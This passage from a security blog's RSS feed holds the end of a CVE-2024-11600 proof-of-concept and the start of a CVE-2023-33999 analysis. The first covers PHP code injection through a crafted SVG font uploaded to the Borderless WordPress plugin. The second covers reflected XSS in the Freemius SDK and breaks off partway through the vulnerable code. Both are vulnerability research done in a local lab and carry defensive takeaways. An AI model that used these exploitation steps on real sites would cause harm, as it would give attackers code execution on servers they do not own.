class=&#34;s&#34;&gt;&amp;#34;M512&amp;ensp;128L128&amp;ensp;512h128v320h192V640h128v192h192V512h128z&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/font&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/defs&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/svg&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Using an Administrator account, upload the ZIP file at the endpoint:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://localhost/wp-admin/admin.php?page=borderless-fonts&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-06-cve-2024-11600/upload.png&#34; title=&#34;Uploaded file&#34; data-thumbnail=&#34;/posts/2025-12-06-cve-2024-11600/upload.png&#34; data-sub-html=&#34;&lt;h2&gt;Uploaded&lt;/h2&gt;&lt;p&gt;Uploaded file&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-06-cve-2024-11600/upload.png&#39; alt=&#34;Uploaded&#34; height=&#34;152&#34; width=&#34;1099&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Uploaded file&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;RCE result&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-06-cve-2024-11600/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-06-cve-2024-11600/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-06-cve-2024-11600/result.png&#39; alt=&#34;Result&#34; height=&#34;757&#34; width=&#34;1491&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2024-11600 demonstrates that using the wrong sanitization function can lead to &lt;strong&gt;Remote Code Execution&lt;/strong&gt;. Borderless (≤ 1.6.0) directly takes the &lt;code&gt;&amp;lt;font&amp;ensp;id&amp;gt;&lt;/code&gt; value from the SVG, sanitizes it only with &lt;code&gt;sanitize_text_field()&lt;/code&gt;, and writes it into a PHP file (&lt;code&gt;charmap.php&lt;/code&gt;). An attacker with Administrator privileges can inject PHP code, which is executed when the file is loaded. Version 1.6.1 fixed this by using &lt;code&gt;sanitize_file_name()&lt;/code&gt; and a fallback value.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Always &lt;strong&gt;sanitize according to context&lt;/strong&gt; (this data is written into PHP, not plain text).&lt;/li&gt;&#xA;&lt;li&gt;Do not use &lt;code&gt;sanitize_text_field()&lt;/code&gt; for data written into executable source code.&lt;/li&gt;&#xA;&lt;li&gt;SVG/ZIP files can also be attack vectors.&lt;/li&gt;&#xA;&lt;li&gt;Automatically generating &lt;code&gt;.php&lt;/code&gt; files must always be strictly controlled.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://vdp.patchstack.com/database/wordpress/plugin/borderless/vulnerability/wordpress-borderless-plugin-1-5-9-authenticated-administrator-remote-code-execution-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Borderless Plugin &amp;lt;= 1.6.0 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2023-33999 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-05-cve-2023-33999/</link>
      <pubDate>Fri, 05 Dec 2025 20:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-05-cve-2023-33999/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-05-cve-2023-33999/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Freemius SDK for WordPress&lt;/strong&gt; does not properly &lt;strong&gt;sanitize&lt;/strong&gt; input data or &lt;strong&gt;escape&lt;/strong&gt; output data, leading to a &lt;strong&gt;Reflected Cross-Site Scripting (XSS)&lt;/strong&gt; vulnerability. This directly affects &lt;strong&gt;more than 1,000 plugins and themes&lt;/strong&gt; using this SDK.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://wpscan.com/vulnerability/35d2f1e7-a4f8-49fd-a8dd-bb2c26710f93/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2023-33999&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.5.9&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.5.10&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (6.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://freemius.com/help/documentation/wordpress-sdk/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Freemius SDK for WordPress&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;TablePress&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.1.4&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.1.5&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any other diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;about-freemius-sdk&#34;&gt;&lt;span&gt;About Freemius SDK&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#about-freemius-sdk&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Freemius SDK&lt;/strong&gt; is a library (Software Development Kit) for &lt;strong&gt;WordPress&lt;/strong&gt;, helping plugin and theme developers easily add the following features to their products:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;License management&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Handling &lt;strong&gt;freemium / premium&lt;/strong&gt; versions&lt;/li&gt;&#xA;&lt;li&gt;Allowing users to &lt;strong&gt;connect accounts (opt-in)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Collecting &lt;strong&gt;usage statistics (analytics)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Managing &lt;strong&gt;payments and renewals&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Displaying &lt;strong&gt;upsell / upgrade&lt;/strong&gt; in the WordPress dashboard&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Freemius SDK&lt;/strong&gt; is not a standalone plugin; it is embedded directly into the source code of other plugins or themes. Therefore, when a vulnerability exists in &lt;strong&gt;Freemius SDK&lt;/strong&gt;, many products are affected. The plugin &lt;a href=&#34;https://wordpress.org/plugins/tablepress/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;TablePress&lt;/strong&gt;&lt;/a&gt; is one of the impacted cases, so it was chosen for analysis.&lt;/p&gt;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version v2.5.9:&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;/**&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&amp;ensp;A&amp;ensp;helper&amp;ensp;method&amp;ensp;to&amp;ensp;fetch&amp;ensp;GET/POST&amp;ensp;user&amp;ensp;input&amp;ensp;with&amp;ensp;an&amp;ensp;optional&amp;ensp;default&amp;ensp;value&amp;ensp;when&amp;ensp;the&amp;ensp;input&amp;ensp;is&amp;ensp;not&amp;ensp;set.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&amp;ensp;@author&amp;ensp;Vova&amp;ensp;Feldman&amp;ensp;(@svovaf)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&amp;ensp;@param&amp;ensp;string&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;$key&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&amp;ensp;@param&amp;ensp;mixed&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;$def&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&amp;ensp;@param&amp;ensp;string|bool&amp;ensp;$type&amp;ensp;Since&amp;ensp;1.2.1.7&amp;ensp;-&amp;ensp;when&amp;ensp;set&amp;ensp;to&amp;ensp;&amp;#39;get&amp;#39;&amp;ensp;will&amp;ensp;look&amp;ensp;for&amp;ensp;the&amp;ensp;value&amp;ensp;passed&amp;ensp;via&amp;ensp;querystring,&amp;ensp;when&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;set&amp;ensp;to&amp;ensp;&amp;#39;post&amp;#39;&amp;ensp;will&amp;ensp;look&amp;ensp;for&amp;ensp;the&amp;ensp;value&amp;ensp;passed&amp;ensp;via&amp;ensp;the&amp;ensp;POST&amp;ensp;request&amp;#39;s&amp;ensp;body,&amp;ensp;otherwise,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;will&amp;ensp;check&amp;ensp;if&amp;ensp;the&amp;ensp;parameter&amp;ensp;was&amp;ensp;passed&amp;ensp;in&amp;ensp;any&amp;ensp;of&amp;ensp;the&amp;ensp;two.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&amp;ensp;@return&amp;ensp;mixed&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*/&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;fs_request_get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$def&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$type&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$type&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$type&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;strtolower&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$type&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span 